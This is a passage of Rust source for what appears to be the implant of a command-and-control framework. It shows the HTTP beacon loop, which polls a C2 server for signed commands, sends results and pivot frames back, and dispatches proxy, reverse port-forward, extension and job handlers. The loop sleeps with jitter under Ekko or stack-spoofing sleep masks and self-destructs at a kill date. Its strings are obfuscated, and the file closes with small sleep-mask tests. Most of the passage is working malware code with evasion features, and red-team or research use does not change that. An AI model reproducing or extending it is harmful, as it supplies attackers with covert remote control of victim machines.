                    Some(http_transport::OutboundItem::Pivot(frame)) => {
                        if let Err(e) = http_transport::send_pivot_frame(&client, &base, &token, &frame, &mut uris, &ep_profile).await {
                            if config.debug { eprintln!("{}: {}", aes_str!("[-] Pivot frame send failed (dropped)"), e); }
                            if matches!(e, http_transport::HttpFailure::SessionInvalid(_)) { continue 'session; }
                        }
                    }
                    None => {}
                }
            }
            while outbox.len() > 0 {
                let send_res = {
                    let resp = outbox.front().expect("len checked").clone();
                    http_transport::send_result_profile(&client, &base, &token, &resp, &mut uris, &ep_profile).await
                };
                match send_res {
                    Ok(()) => outbox.pop(),
                    Err(http_transport::HttpFailure::Transport(e)) => {
                        outbox.note_send_failure(config.debug);
                        if config.debug { eprintln!("{}: {}", aes_str!("[-] Result send failed (queued)"), e); }
                        break; // C2 unreachable; retry next cycle
                    }
                    Err(http_transport::HttpFailure::SessionInvalid(e)) => {
                        if config.debug { eprintln!("{}: {}", aes_str!("[-] Session rejected on send - re-registering"), e); }
                        continue 'session;
                    }
                }
            }

            // 2. Poll for new commands (profile URIs, rotated per call);
            // downstream pivot frames ride home in the same body.
            match http_transport::poll_profile(&client, &base, &token, &mut uris, &ep_profile).await {
                Ok(batch) => {
                    poll_failures = 0;
                    for frame in batch.pivot_frames {
                        pivot_mgr.lock().await.handle_downstream_frame(frame);
                    }
                    for cmd in batch.commands {
                        let action = process_http_command(
                            &cmd, &verify_key, &mut last_counter,
                            &proxy_handle, &rportfwd_handles, &ext_manager, &job_mgr,
                            &active_host, &tx, &pivot_mgr,
                        ).await;

                        match action {
                            handlers::AgentAction::UpdateConfig(s, min, max) => {
                                base_sleep = s; base_jitter_min = min; base_jitter_max = max;
                            }
                            handlers::AgentAction::UpdateFallback(fb) => {
                                // Stored and re-seeded; the live poll loop
                                // retargets on the next registration cycle.
                                config.fallback = fb;
                                fb_mgr = fallback::FallbackManager::from_config(&config);
                            }
                            // The poll interval is re-read every cycle below, so
                            // beacon:mode works over HTTP too: active mode swaps
                            // the configured interval for a fast fixed poll.
                            handlers::AgentAction::SetMode(active) => { is_active_mode = active; }
                            handlers::AgentAction::None => {}
                        }
                    }
                }
                Err(http_transport::HttpFailure::SessionInvalid(e)) => {
                    // Server no longer knows this token (prune, restart):
                    // re-register instead of polling the decoy page forever.
                    if config.debug { eprintln!("{}: {}", aes_str!("[-] Session invalid - re-registering"), e); }
                    continue 'session;
                }
                Err(http_transport::HttpFailure::Transport(e)) => {
                    poll_failures = poll_failures.saturating_add(1);
                    if config.debug {
                        eprintln!("{}: {} ({}/{})", aes_str!("[-] Poll error"), e, poll_failures, MAX_POLL_FAILURES);
                    }
                    if poll_failures >= MAX_POLL_FAILURES {
                        // Endpoint looks dead: count it and re-register,
                        // which walks the fallback list.
                        fb_mgr.record_failure(ep_idx);
                        continue 'session;
                    }
                }
            }

            // 3. Park outbound items generated by command processing;
            // results flush at the top of the next cycle, pivot frames go
            // out immediately and are never requeued.
            while let Ok(data) = rx.try_recv() {
                match http_transport::classify_outbound(&data) {
                    Some(http_transport::OutboundItem::Result(resp)) => outbox.push(resp, config.debug),
                    Some(http_transport::OutboundItem::Pivot(frame)) => {
                        if let Err(e) = http_transport::send_pivot_frame(&client, &base, &token, &frame, &mut uris, &ep_profile).await {
                            if config.debug { eprintln!("{}: {}", aes_str!("[-] Pivot frame send failed (dropped)"), e); }
                            if matches!(e, http_transport::HttpFailure::SessionInvalid(_)) { continue 'session; }
                        }
                    }
                    None => {}
                }
            }

            // 4. Sleep with jitter (active mode: fast fixed poll, no
            // jitter). Consecutive transport failures back the sleep off
            // exponentially (cap 5 min) so a sick server is not hammered.
            let sleep_duration = if is_active_mode {
                std::time::Duration::from_millis(500)
            } else {
                let base_ms = if base_sleep > 0 { base_sleep * 1000 } else { 5000 };
                let jitter_ms = if base_jitter_max > 0 {
                    rand::thread_rng().gen_range(base_jitter_min..=base_jitter_max.max(base_jitter_min)) as u64
                } else { 0 };
                let base = std::time::Duration::from_millis(base_ms + jitter_ms);
                let factor = 1u32 << poll_failures.min(4);
                std::cmp::min(base * factor, std::time::Duration::from_secs(300))
            };
            // Passive sleeps go through the sleep mask (config encryption,
            // Ekko/spoof per sleep_mask) like the TCP loop; the active-mode
            // fast poll stays a plain sleep so masking latency does not
            // break interactivity.
            if is_active_mode {
                tokio::time::sleep(sleep_duration).await;
            } else {
                config = sleep_with_mask(config, sleep_duration).await;
            }

            // 5. Check kill date
            if let Some(kill_ts) = config.kill_date {
                if chrono::Utc::now().timestamp() > kill_ts {
                    utils::self_destruct();
                }
            }
        }
    }
}

/// Process a single command in HTTP mode.
async fn process_http_command(
    cmd: &SecuredCommand,
    verify_key: &VerifyingKey,
    last_counter: &mut u64,
    proxy_handle: &Arc<Mutex<Option<tokio::task::AbortHandle>>>,
    rportfwd_handles: &Arc<Mutex<Vec<handlers::RportfwdHandle>>>,
    ext_manager: &Arc<Mutex<ExtensionManager>>,
    job_mgr: &Arc<Mutex<JobManager>>,
    c2_host: &str,
    tx: &tokio::sync::mpsc::Sender<Vec<u8>>,
    pivot_mgr: &Arc<tokio::sync::Mutex<PivotManager>>,
) -> handlers::AgentAction {
    if cmd.counter <= *last_counter { return handlers::AgentAction::None; }

    let sign_bytes = cmd.get_signable_bytes();
    let sig_bytes = BASE64.decode(&cmd.signature).unwrap_or_default();
    let sig_arr: [u8; 64] = sig_bytes.try_into().unwrap_or([0u8; 64]);
    let sig = ed25519_dalek::Signature::from_bytes(&sig_arr);

    if verify_key.verify(&sign_bytes, &sig).is_err() {
        return handlers::AgentAction::None;
    }

    *last_counter = cmd.counter;

    if cmd.command == aes_str!("exit") {
        std::process::exit(0);
    }

    let ctx = handlers::HandlerContext {
        proxy_handle: proxy_handle.clone(),
        rportfwd_handles: rportfwd_handles.clone(),
        ext_manager: ext_manager.clone(),
        job_manager: job_mgr.clone(),
        c2_host: c2_host.to_string(),
        tx: tx.clone(),
        pivot_mgr: pivot_mgr.clone(),
    };

    // Create an owned SecuredCommand for dispatch
    let owned_cmd = SecuredCommand {
        session_id: cmd.session_id.clone(),
        counter: cmd.counter,
        nonce: cmd.nonce,
        timestamp: cmd.timestamp,
        command: cmd.command.clone(),
        signature: cmd.signature.clone(),
    };

    handlers::dispatch(&ctx, owned_cmd).await
}

/// Compute HMAC-SHA256(challenge_key, build_id || exe_id) for ClientHello authentication.
/// Returns empty string if challenge_key is not configured (backward compatible).
fn compute_auth_hmac(challenge_key_b64: &str, build_id: &str, exe_id: &str, timestamp: &str) -> String {
    if challenge_key_b64.is_empty() {
        return String::new();
    }
    let key_bytes = match BASE64.decode(challenge_key_b64) {
        Ok(b) => b,
        Err(_) => return String::new(),
    };
    use hmac::{Hmac, Mac};
    use sha2::Sha256;
    type HmacSha256 = Hmac<Sha256>;
    match <HmacSha256 as Mac>::new_from_slice(&key_bytes) {
        Ok(mut mac) => {
            // Length-prefix each field to prevent concatenation collisions
            mac.update(&(build_id.len() as u32).to_le_bytes());
            mac.update(build_id.as_bytes());
            mac.update(&(exe_id.len() as u32).to_le_bytes());
            mac.update(exe_id.as_bytes());
            mac.update(&(timestamp.len() as u32).to_le_bytes());
            mac.update(timestamp.as_bytes());
            BASE64.encode(mac.finalize().into_bytes())
        }
        Err(_) => String::new(),
    }
}


#[cfg(test)]
mod tests {
    use super::{classify_sleep_mask, SleepMaskKind};

    #[test]
    fn classify_sleep_mask_known_values() {
        assert_eq!(classify_sleep_mask("plain"), SleepMaskKind::Plain);
        assert_eq!(classify_sleep_mask("none"), SleepMaskKind::Plain);
        assert_eq!(classify_sleep_mask("spoofed-stack"), SleepMaskKind::SpoofedStack);
        assert_eq!(classify_sleep_mask("ekko"), SleepMaskKind::Ekko);
    }

    #[test]
    fn classify_sleep_mask_unknown_falls_back_to_ekko() {
        // No Foliage implementation exists; the old vocabulary value is
        // unrecognized and must fail safe toward maximum masking.
        assert_eq!(classify_sleep_mask("foliage"), SleepMaskKind::Ekko);
        assert_eq!(classify_sleep_mask(""), SleepMaskKind::Ekko);
        assert_eq!(classify_sleep_mask("EKKO"), SleepMaskKind::Ekko);
    }
}
